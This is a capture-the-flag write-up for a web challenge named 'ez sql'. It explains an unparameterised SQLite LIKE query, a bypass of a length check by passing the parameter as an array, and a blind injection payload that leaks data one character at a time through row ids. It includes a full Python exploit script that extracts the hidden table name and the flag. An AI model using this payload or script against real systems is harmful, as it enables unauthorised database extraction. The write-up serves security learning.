# ez sql - Web
just your average sql challenge, nothing else to see here (trust)
https://ez-sql.tjc.tf/ 

## What type of web challenge is this?

The title suggests a sql injection, and a fairly easy one.

## Finding the goal.

After looking through the source code I notice that the flag is stored in a table
that consists of format "flag_" + random uuid V4.

```js
const flagTable = `flag_${uuid.v4().replace(/-/g, '_')}`;
db.run(`CREATE TABLE IF NOT EXISTS ${flagTable} (flag TEXT)`);
```
So our goal is:
1. Figure out where sql injection can happen.
2. Find flag table
3. Get the flag entry.

## Planning SQL Injection

There's not really much to this application than a search endpoint to find jokes.
So I noticed the query to find a joke wasn't paramterized.
I can recommend to learn about [sql paramterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) if you don't know about it already.
It's very useful to recognize if an application is vulnerable to sql injection.

```js
db.all(`SELECT * FROM jokes WHERE joke LIKE '%${name}%'`, (err, rows)
```

So here's the attack vector, but to be honest I didn't know what to do. 
I work as a full-stack developer, so I know sql from before but LIKE clause was still new to me.

I tried out [SQLMap](https://sqlmap.org/) to see if that was easy solution, but I wasn't really able to figure how to set it up. So instead I went my own way doing research.

I remember seeing the list of jokes, and came up with the idea of fetching each character.
There's probably an easier way, but at the moment this is where my mind came up with.

How can I make a query fetch one of the characters of the flag table?
Lets first just disassemble what a character is?

Computers works in bits, so how can we convert the character 'A' to something the computer understands. Numbers!
If we look at [ASCII code table](https://theasciicode.com.ar/), we can see that character 'A' is code 65.


## Making the SQL Query

So my idea is using SUBSTRING to fetch a character based of the index we give, and then convert it to ASCII/Unicode
> Note: Unicode is extension of ASCII, you can read more about it here. [What is Unicode?](https://home.unicode.org/about-unicode/)

We can then use the id to fetch a joke that has that exact id, and later use the same id to get the character back as a string.

Here's the query format I came up with:

```sql
'and id = unicode(substring(({query}), {index}, 1)) --
```

We first end the LIKE clause with `'`, and then tell that id needs to be the unicode of the character
we fetch from the query using `substring`.

### Getting the table name

Since the application is using sqlite we can use sqlite_master table to find names of other tables.
```sql
SELECT name FROM sqlite_master WHERE type='table' and tbl_name not like 'jokes'
```

So I came up with this simple query that fetches entries where type is table
and table name is not 'jokes'. 

After that we can do a simple select query with the table name we got.
```sql
SELECT flag from TABLE_NAME_HERE
```


### Anything else?
Lets go over the endpoint to see if there's more to the challenge.

```js
app.get('/search', (req, res) => {
    const { name } = req.query;

    if (!name) {
        return res.status(400).send({ err: 'Bad request' });
    }

    if (name.length > 6) {
        return res.status(400).send({ err: 'Bad request' });
    }

    db.all(`SELECT * FROM jokes WHERE joke LIKE '%${name}%'`, (err, rows) => {
        if (err) {
            console.error(err.message);
            return res.status(500).send('Internal server error');
        }

        return res.send(rows);
    });
});
```

I notice that the name length can't be longer than 6 characters.
Since the application is written in javascript we can easily bypass that check.

In javascript we have different types that has .length, and since we see no check for other types.
We can send name in as array, then we can have max 6 elements in the array.

I recommend reading about [Javascript data types](https://www.w3schools.com/js/js_datatypes.asp) if you aren't known with them. 

## Exploit script

Here's the script I made to get the flag.
I tested this first locally to make sure it worked.

And then it was just testing it on the remote to get the flag.

```python
from requests import get
import time

baseHost = "URL"

def charArrayToString(s):
    new = ""
    for x in s:
        new += x
    return new

def sqli(query, index):
    return f"'and id = unicode(substring(({query}), {index}, 1)) --"

def getCharFromReq(query):
    params = {
        'name': [query, ''],
        }
    req = get(f"{baseHost}/search", params=params)
    json = req.json()
    if (len(json) == 0):
        return 0
    return chr(req.json()[0]['id'])

def getDatabaseName():
    flagPart = []
    flagIndexes = range(0, 39)
    flagNameQuery = "SELECT name FROM sqlite_master WHERE type='table' and tbl_name not like 'jokes'"
    
    for x in flagIndexes:
        print(f"Current char:{x}")
        char = getCharFromReq(sqli(flagNameQuery, x + 6))
        if(char == 0):
            break
        print(char)
        flagPart.append(char)
        time.sleep(0.25)        
    print(flagPart)
    return 'flag_' + charArrayToString(flagPart)

def getFlag(tableName):
    flagPart = []
    flagIndexes = range(0, 40)
    flagNameQuery = f"SELECT flag FROM {tableName}"

    for x in flagIndexes:
        print(f"Current char:{x}")
        char = getCharFromReq(sqli(flagNameQuery, x))
        if(char == 0):
            break
        print(char)
        flagPart.append(char)
        time.sleep(0.25)        
    print(flagPart)
    return charArrayToString(flagPart)



flagTable = getDatabaseName()
print(f"Got database name: {flagTable}")
flag = getFlag(flagTable)
print(flag)
```

